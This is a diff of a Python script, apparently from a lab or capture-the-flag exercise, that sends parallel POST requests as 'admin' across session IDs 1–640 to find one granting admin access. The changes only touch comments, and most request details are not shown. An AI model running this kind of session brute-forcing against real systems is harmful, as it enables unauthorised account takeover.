@@ -13,7 +13,6 @@ last_password = None
 
 session_range = range(1,641)
 
-# Function to send a POST request with form data
 def send_request(session_ID):
     try:
         form_data = {'username': 'admin',
@@ -32,14 +31,11 @@ def send_request(session_ID):
     except requests.exceptions.RequestException as e:
         return False, None, None
 
-# Function to perform multiple requests in parallel
 def perform_parallel_requests():
-    # Create a ThreadPoolExecutor to handle multiple requests in parallel
     with ThreadPoolExecutor(max_workers= len(session_range)) as executor:
-        # Submit request for each character
+        # Submit request for each session
         futures = [executor.submit(send_request, i) for i in session_range]
 
-        # Wait for all futures to complete and collect results
         for future in futures:
             admin, session, response = future.result()
             print(f"Session id: {session} | admin: {admin}")
